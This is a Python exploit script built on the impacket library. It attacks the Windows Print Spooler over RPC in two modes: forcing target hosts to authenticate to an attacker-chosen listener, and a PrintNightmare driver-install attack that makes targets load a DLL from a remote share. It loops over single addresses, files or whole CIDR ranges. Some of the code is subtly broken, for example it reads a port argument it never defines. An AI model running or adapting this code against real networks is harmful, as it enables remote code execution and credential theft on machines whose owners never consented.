#!/usr/bin/env python3.7
import argparse
import ipaddress
import re
import sys
import socket
import pathlib

from struct import unpack
from time import sleep

from impacket import version, system_errors, LOG
from impacket.dcerpc.v5 import rprn, transport
from impacket.dcerpc.v5.dtypes import NULL, UUID, ULONG, WSTR
from impacket.structure import Structure, hexdump

class DcePrinterPwn:

	def __init__(self):
		self._dce = None
		self.rhost = None
		self.rport = None
		self.lhost = None
		self.lshare = None
		self.domain = None
		self.user = None
		self.passwd = None
		self.nthash = None
		self.lmhash = None

		# Initialized by call_open_printer()
		self._handle = NULL

		# Nightmare specific vars
		self._drivers = None

	def connect(self):
		assert self.rhost is not None and self.rport is not None
		assert self.domain is not None and self.user is not None
		assert self.passwd is not None

		# Make connection to remote host
		bindStr = f"ncacn_np:{self.rhost}[\\pipe\\spoolss]"
		rpcTrans = transport.DCERPCTransportFactory(bindStr)

		rpcTrans.set_dport(self.rport)

		if hasattr(rpcTrans, 'set_credentials'):
			rpcTrans.set_credentials(self.user, self.passwd, self.domain, self.nthash, self.lmhash)

		self._dce = rpcTrans.get_dce_rpc()

		try:
			self._dce.connect()
		except Exception as e:
			return False

		try:
			self._dce.bind(rprn.MSRPC_UUID_RPRN)
		except Exception as e:
			return False

		return True

	def call_open_printer(self):
		assert self._dce is not None

		try:
			rpcOpenStr = f"\\\\{self.rhost}"
			resp = rprn.hRpcOpenPrinter(self._dce, rpcOpenStr)
			self._handle = resp['pHandle']
		except Exception as e:
			self._dce.disconnect()
			return False

		return True

	def call_remote_printer_change(self):
		assert self._dce is not None
		assert self.lhost is not None

		try:
			pszLocalMachine = f"\\\\{self.lhost}\\0x00"
			resp = rprn.hRpcRemoteFindFirstPrinterChangeNotificationEx(self._dce, self._handle, rprn.PRINTER_CHANGE_ADD_JOB, pszLocalMachine=pszLocalMachine)
		except Exception as e:
			self._dce.disconnect()
			return False

		self._dce.disconnect()
		return True

	def call_enum_printer_drivers(self):
		assert self._dce is not None

		try:
			resp = rprn.hRpcEnumPrinterDrivers(self._dce, pName=self._handle, pEnvironment="Windows x64\x00", Level=2)
			data = b''.join(resp['pDrivers'])

			self._drivers = DRIVER_INFO_2_BLOB()
			self._drivers.fromString(data)
		except Exception as e:
			self._dce.disconnect()
			return False

		return True

	def call_add_printer_driver(self):
		assert self._dce is not None
		assert self._drivers is not None
		assert self.lshare is not None

		stage = 0

		try:
			pDriverPath = f"{pathlib.PureWindowsPath(self._drivers['DriverPathArray']).parent}\\UNIDRV.DLL"

			container_info = rprn.DRIVER_CONTAINER()
			container_info['Level'] = 2
			container_info['DriverInfo']['tag'] = 2
			container_info['DriverInfo']['Level2']['cVersion'] = 3
			container_info['DriverInfo']['Level2']['pName'] = "1234\x00"
			container_info['DriverInfo']['Level2']['pEnvironment'] = "Windows x64\x00"
			container_info['DriverInfo']['Level2']['pDriverPath'] = f"{pDriverPath}\x00"
			container_info['DriverInfo']['Level2']['pDataFile'] = f"{self.lshare}\x00"
			container_info['DriverInfo']['Level2']['pConfigFile'] = "C:\\Windows\\System32\\kernelbase.dll\x00"

			flags = rprn.APD_COPY_ALL_FILES | 0x10 | 0x8000
			filename = self.lshare.split("\\")[-1]

			resp = rprn.hRpcAddPrinterDriverEx(self._dce, pName=self._handle, pDriverContainer=container_info, dwFileCopyFlags=flags)

			for stage in range(1, 30):
				try:
					container_info['DriverInfo']['Level2']['pConfigFile'] = f"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\{stage}\\{filename}\x00"

					resp = rprn.hRpcAddPrinterDriverEx(self._dce, pName=self._handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
					if (resp['ErrorCode'] == 0):
						self._dce.disconnect()
						return True
				except Exception as e:
					pass

		except Exception as e:
			self._dce.disconnect()
			return False

		self._dce.disconnect()
		return False


def tcp_port_open(host, port, timeout=1):
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.settimeout(timeout)
		sock.connect((host, port))
		sock.close()
		return True
	except Exception as e:
		sock.close()
		return False

def generate_targets(target):
	if target.startswith('file:'):
		filename = ':'.join(target.split(':')[1:])

		with open(filename, 'r', encoding='utf-8') as input_fh:
			targets = input_fh.read()

		for t in targets.split('\n'):
			t = t.strip()
			yield t

	# IPv4 Address
	elif re.match(r'^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$', target):
		yield target

	# IPv4 CIDR Range
	elif re.match(r'^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/[0-9]{1,2}$', target):
		for t in ipaddress.IPv4Network(target):
			yield str(t)

	# Assumed hostname
	else:
		yield target

def main():
	parser = argparse.ArgumentParser(add_help=True, description='Coerce remote systems to authenticate', formatter_class=argparse.RawDescriptionHelpFormatter)
	parser.add_argument('technique', action='store', help='attack technique to execute', choices=['spooler', 'nightmare'])
	parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
	parser.add_argument('--share', action='store', required=False, default=None, help='path to DLL (ex: \'\\\\10.1.10.199\\share\\Program.dll\')')
	parser.add_argument('--lhost', action='store', required=False, default=None, help='listening hostname or IP')

	group = parser.add_argument_group('authentication')
	group.add_argument('-hashes', action='store', metavar='LMHASH:NTHASH', help='NTLM hashes, format is LMHASH:NTHASH')

	group = parser.add_argument_group('connection')
	group.add_argument('-target-ip', action='store', metavar='ip address', help='IP Address of the target machine. If omitted it will use whatever was specified as target.')
	args = parser.parse_args()

	if len(sys.argv) == 1:
		parser.print_help()
		sys.exit(1)

	domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(args.target).groups('')

	# In case the password contains '@'
	if '@' in address:
		password = password + '@' + address.rpartition('@')[0]
		address = address.rpartition('@')[2]

	if domain is None:
		domain = ''

	if password == '' and username != '' and args.hashes is None:
		print('[-] A password or NTLM hash is required')
		return

	if args.hashes is not None:
		lmhash, nthash = args.hashes.split(':')
	else:
		lmhash = ''
		nthash = ''

	if args.technique == 'nightmare' and args.share is None:
		print("[-] Please specify a network share with the --share parameter")
		return
	elif args.lhost is None:
		print("[-] Please specify an IP address or hostname with the --lhost parameter")
		return

	if args.technique == 'spooler':
		for rhost in generate_targets(address):
			print(f"[*] {rhost}...", end='', flush=True)

			if tcp_port_open(rhost, args.port, timeout=1):
				dce = DcePrinterPwn()
				dce.rhost = rhost
				dce.rport = args.port
				dce.lhost = args.lhost
				dce.domain = domain
				dce.user = username
				dce.passwd = password
				dce.nthash = nthash
				dce.lmhash = lmhash

				# Go to next target if connection failed
				if dce.connect() is False:
					print(f'connection failed')
					continue

				print(f'connected...', end='', flush=True)

				# Go to next target if open printer failed
				if dce.call_open_printer() is False:
					print(f'open printer failed')
					continue

				print(f'printer opened...', end='', flush=True)

				if dce.call_remote_printer_change() is False:
					print(f'exploited')
				else:
					print(f'exploited (printer changed, may need cleanup)')

			else:
				print(f'port closed')
				continue

	elif args.technique == 'nightmare':
		for rhost in generate_targets(address):
			print(f"[*] {rhost}...", end='', flush=True)

			if tcp_port_open(rhost, args.port, timeout=1):
				attempts = 1
				success = False

				while (attempts <= 3) and (success is False):
					print(f"attempt {attempts}...", end='', flush=True)

					dce = DcePrinterPwn()
					dce.rhost = rhost
					dce.rport = args.port
					dce.lshare = args.share
					dce.domain = domain
					dce.user = username
					dce.passwd = password
					dce.nthash = nthash
					dce.lmhash = lmhash

					# Go to next target if connection failed
					if dce.connect() is False:
						attempts = 4

					# Go to next target if enum drivers failed
					if dce.call_enum_printer_drivers() is False:
						attempts = 4

					# Break from loop if successful
					if dce.call_add_printer_driver() is True:
						success = True

					else:
						sleep(10)
						attempts += 1

				if success is True:
					print(f'exploit success')
				else:
					print(f'exploit failed')

			else:
				print(f'port closed')
				continue

if __name__ == '__main__':
	main()
